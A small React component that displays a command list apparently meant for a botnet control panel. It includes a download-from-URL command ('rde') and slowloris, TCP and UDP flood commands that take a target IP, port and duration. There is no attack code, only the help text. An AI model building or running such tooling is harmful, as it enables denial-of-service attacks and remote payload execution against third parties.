import React, { FC } from "react";

const Commands: FC = () => {
  return (
    <div style={{ marginLeft: 15 }}>
      <b>Commands :</b>
      <ul>
        <li>quit</li>
        <li>rde http(s)://www.some-url.com/file.any</li>
        <li>slowloris ip port duration (in ms)</li>
        <li>tcp ip port duration (in ms)</li>
        <li>udp ip port duration (in ms)</li>
        <li></li>
      </ul>
    </div>
  );
};
export default Commands;
